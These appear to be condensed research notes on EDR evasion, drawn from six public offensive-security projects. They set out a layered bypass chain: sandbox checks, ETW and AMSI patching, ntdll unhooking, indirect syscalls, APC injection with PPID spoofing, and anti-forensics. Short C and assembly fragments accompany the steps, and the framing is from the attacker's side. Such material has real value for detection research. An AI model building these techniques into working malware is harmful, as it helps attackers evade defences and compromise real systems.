# EDR Bypass Chain — Source Code Findings (2026-06-07)

Condensed from reading 6 GitHub projects' C/C++/ASM source code.

---

## 1. KHẠOS Loader (`28Zaaky/Shellcode-Ldr`, 381⭐)

### Complete bypass chain (in order):

```
malware.exe
  ├─ FreeConsole() — no visible window
  ├─ Benign API calls — dilute suspicious import ratio for ML scanners
  ├─ AntiSandboxDelay 120s
  │   └─ QueryPerformanceCounter → Sleep(120000ms) → QueryPerformanceCounter again
  │   → elapsed < 90% expected → time acceleration detected → exit
  ├─ Sandbox evasion (6 checks, composite scoring, threshold=50)
  │   ├─ CheckVirtualMachine  — VMware/VBox/Hyper-V registry keys + driver files
  │   ├─ CheckDebugger        — PEB.BeingDebugged + NtQueryInformationProcess(ProcessDebugPort)
  │   ├─ CheckSystemResources — CPU<2 / RAM<4GB / disk<80GB
  │   ├─ CheckUptime          — <10 min → sandbox indicator
  │   ├─ CheckUserActivity    — user count + GetLastInputInfo idle time
  │   └─ CheckProcessCount    — <50 processes
  ├─ UnhookNTDLL — read clean .text from disk, memcpy over hooked copy
  ├─ ETW bypass  — patch EtwEventWrite/Ex first byte to C3 (ret)
  ├─ AMSI bypass — patch AmsiScanBuffer first byte to C3 (ret)
  ├─ Indirect syscall init:
  │   ├─ Load fresh ntdll.dll from disk (clean copy)
  │   ├─ ROR13 hash → parse Export Directory (no cleartext function names in source)
  │   ├─ Extract SSN from stub (mov r10, rcx; mov eax, <SSN> pattern)
  │   └─ Locate "syscall; ret" gadget (0F 05 C3) for indirect dispatch
  └─ APC injection + PPID spoofing:
        ├─ OpenProcess(explorer.exe) → attribute list
        ├─ CreateProcess(rundll32.exe, CREATE_SUSPENDED, parent=explorer)
        ├─ NtAllocateVirtualMemory → RWX
        ├─ NtWriteVirtualMemory → shellcode
        ├─ NtQueueApcThread → register shellcode as APC
        └─ NtResumeThread → alertable state → shellcode runs
```

### Key source code pattern — ROR13 hash:

```c
// Precomputed hashes (no cleartext function names in source)
#define HASH_NtAllocateVirtualMemory 0x5947FD91
#define HASH_NtWriteVirtualMemory    0x4B2D0096

static DWORD ror13_hash(const char *name) {
    DWORD hash = 0;
    while (*name) {
        hash = (hash >> 13) | (hash << (32 - 13));  // Rotate right 13
        hash += (*name >= 'a') ? (*name - 0x20) : *name;  // uppercase
        name++;
    }
    return hash;
}
```

### Key source code pattern — Indirect syscall stub (dosyscall.S):

```asm
DoSyscall:
    movq %rdx, %rbx             # save syscall gadget address
    movl %ecx, %esi             # save SSN
    # remap args to syscall ABI: R10=arg1, RDX=arg2, R8=arg3, R9=arg4
    movq %r8, %r10
    movq %r9, %rdx
    movl %esi, %eax             # EAX = SSN
    call *%rbx                  # indirect call through ntdll gadget
    ret
```

### Key source code pattern — .text section unhooking:

```c
BOOL RestoreTextSection(PVOID hookedNtdll, PVOID freshNtdll) {
    FindTextSection(hookedNtdll, &hookedText, &hookedSize);    // by VirtualAddress
    FindTextSectionRaw(freshNtdll, &freshText, &freshSize);    // by PointerToRawData
    VirtualProtect(hookedText, restoreSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(hookedText, freshText, restoreSize);
    VirtualProtect(hookedText, restoreSize, oldProtect, &tmp);
    FlushInstructionCache(GetCurrentProcess(), hookedText, restoreSize);
}
```

### Sandbox scoring system:

| Check | Score | Threshold |
|-------|-------|-----------|
| VM detected | +30 | ≥50 → exit |
| Debugger detected | +40 | |
| Low resources | +20 | |
| Uptime < 10 min | +15 | |
| No user activity | +10 | |
| Processes < 50 | +15 | |

---

## 2. LayeredSyscall (`WKL-Sec/LayeredSyscall`)

### Core innovation: VEH + Hardware Breakpoint to forge call stack

Not just indirect syscall — this forges a **legitimate Windows API call stack** so EDR's stack trace analysis sees a real `MessageBox` call, not a syscall from your code.

### Architecture:

```
wrpNtAllocateVirtualMemory(...) {
    // 1. Resolve real function from ntdll
    orgFunc = GetProcAddress("ntdll.dll", "NtAllocateVirtualMemory");
    // 2. Get SSN from Exception Directory (not from stub bytes!)
    int ssn = GetSsnByName("NtAllocateVirtualMemory");
    // 3. Set hardware breakpoint, trigger VEH
    SetHwBp(orgFunc, TRUE, ssn);
    // 4. Call original function — VEH intercepts before syscall
    return orgFunc(ProcessHandle, ...);
}
```

### VEH exception chain — 3 stages:

**Stage 1 — EXCEPTION_ACCESS_VIOLATION:**
```
1. First call to any wrpNt* triggers access violation
2. In handler: find syscall;ret opcode offset in ntdll .text
3. Set Dr0 = syscall_addr, Dr1 = ret_addr (hardware breakpoints)
4. Advance RIP past the access violation instruction
```

**Stage 2 — Hit syscall breakpoint (EXCEPTION_SINGLE_STEP):**
```
1. Save all register context to SavedContext
2. Clear Dr0 breakpoint
3. Change RIP to demofunction (e.g. MessageBoxW)
4. Set Trace Flag (EFlags bit 8) — single-step through ntdll
5. Single-step through ntdll until finding:
   - sub rsp, 0x58+ (large stack frame = real Windows API)
   - CALL instruction (function call within ntdll)
6. Now the call stack has a legitimate Windows API frame
```

**Stage 3 — Hit ret breakpoint:**
```
1. Clear Dr1 breakpoint
2. Restore RSP from SavedContext
3. Return to original program
4. EDR sees: UserCode → MessageBoxW → ntdll code → syscall
```

### GetSsnByName — Exception Directory parsing (no stub reading):

```c
int GetSsnByName(PCHAR syscall) {
    auto Ldr = NtCurrentTeb()->ProcessEnvironmentBlock->Ldr;
    // Walk ntdll's runtime function table
    for (int i = 0; rtf[i].BeginAddress; i++) {
        for (int j = 0; j < exp->NumberOfFunctions; j++) {
            if (adr[ord[j]] == rtf[i].BeginAddress) {
                // Compare function name
                // If matches, return current SSN
                // If starts with "Zw", increment SSN count
            }
        }
    }
}
```
Source: `HookModule.cpp` — uses IMAGE_DIRECTORY_ENTRY_EXCEPTION not export table.

### Wrapped functions (32 NT APIs):

NtCreateProcess, NtCreateThreadEx, NtOpenProcess, NtOpenProcessToken,
NtOpenThread, NtSuspendProcess, NtSuspendThread, NtResumeProcess, NtResumeThread,
NtGetContextThread, NtSetContextThread, NtClose, NtReadVirtualMemory,
NtWriteVirtualMemory, NtAllocateVirtualMemory, NtProtectVirtualMemory,
NtFreeVirtualMemory, NtQuerySystemInformation, NtQueryDirectoryFile,
NtQueryInformationFile, NtQueryInformationProcess, NtQueryInformationThread,
NtCreateSection, NtOpenSection, NtMapViewOfSection, NtUnmapViewOfSection,
NtAdjustPrivilegesToken, NtDeviceIoControlFile, NtQueueApcThread,
NtWaitForMultipleObjects, NtCreateUserProcess, NtAlertResumeThread

---

## 3. NtUnhook (`S12cybersecurity/NtUnhook`)

### Fileless NTDLL unhooking from suspended child process

```
1. Spawn cmd.exe in CREATE_SUSPENDED mode
2. ReadProcessMemory to read child's clean ntdll.dll image
3. Parse export table, find all Nt* functions
4. Find 23-byte syscall prologue (mov r10, rcx; mov eax, imm; syscall; ret)
5. Use RVA matching to selectively overwrite hooked stubs
6. Terminate child process. Zero disk I/O.
```

Two modes: UnhookDetectedHooks (only changed stubs) / UnhookDesiredHooks (specific functions)

### Comparison:

| Technique | Disk I/O | Stealth |
|-----------|----------|---------|
| Load clean DLL from disk | Yes | Low |
| Hell's Gate | No | Medium |
| Perun's Fart | No | High |
| **NtUnhook** | **No** | **Very High** |

---

## 4. BOAZ (`thomasxm/BOAZ_beta`, BlackHat USA 2024)

### Three-layer evasion:

| Layer | What It Bypasses | Key Techniques |
|-------|-----------------|----------------|
| **Signature** | Static signatures | 10 encodings (UUID/XOR/MAC/IPv4/base45/base58/ChaCha20/RC4/AES/DES), LLVM IR obfuscation (Pluto: bcf/fla/gle/mba/sub + Akira: encrypted jumps/calls/references) |
| **Heuristic** | Emulation | Anti-emulation checks, API unhooking (3 methods), Sifu memory guard (HWBP-based), sleep mask (Ekko via CreateTimerQueueTimer), stack encryption sleep |
| **Behavioral** | Runtime EDR | 50+ loaders, ETW bypass (3 methods), PPID spoofing, self-deletion, anti-forensics |

**ETW bypass — 3 methods:**
1. Hot patch NtTraceEvent → xor rax, rax; ret
2. Patchless: VEH → HWBP → redirect RIP past syscall (no memory modification)
3. Page guard → VEH → VCH stealth guard

**PIC converters:** Donut, PE2SH, RC4, Amber, Shoggoth, Stardust

---

## 5. Havoc C2 Demon

- Indirect syscalls — return address spoofed to `NtAddBootEntry`
- 3 sleep mask techniques: WaitForSingleObjectEx / FOLIAGE / Ekko
- Return address stack spoofing during sleep
- C2 channels: mTLS / WireGuard / HTTP(S) / DNS
- Arch: Source/Asm, Source/Core, Source/Crypt, Source/Extra (KaynLdr), Source/Inject, Source/Loader (COFF + Beacon API), Source/Main

---

## 6. RingReaper (`MatheuZSecurity/RingReaper`, 381⭐)

- Linux post-exploitation agent using **io_uring** to avoid traditional syscalls
- EDR detected GCC compilation in real-time — compile offline
- Uses temp.sh for stealthy payload delivery

---

## Full EDR Bypass Chain Diagram

```
Layer 1: Sandbox Evasion
  ├─ VM detection (registry + drivers) | Debugger detection (PEB + NtQueryInfo)
  ├─ Resource check (CPU<2/RAM<4GB/disk<80GB) | Uptime<10min
  └─ Anti-sandbox delay 120s (QueryPerformanceCounter verify)

Layer 2: Telemetry Bypass
  ├─ ETW: patch EtwEventWrite/Ex → C3 (ret)  or VEH redirect (patchless)
  └─ AMSI: patch AmsiScanBuffer → C3 (ret)

Layer 3: NTDLL Unhooking
  ├─ Disk read → memory | Suspended process (zero I/O) | Perun's Fart | Halo's Gate

Layer 4: Indirect Syscall
  ├─ Dynamic SSN (ROR13 hash) | call *rbx through ntdll gadget
  └─ VEH+HWBP: forge legitimate Windows API call stack

Layer 5: Process Injection
  ├─ APC injection | PPID spoofing | Process hollowing | Reflective loading

Layer 6: Anti-Forensics
  └─ Self-deletion | AmCache/ShimCache wipe | Timestamp modification
```
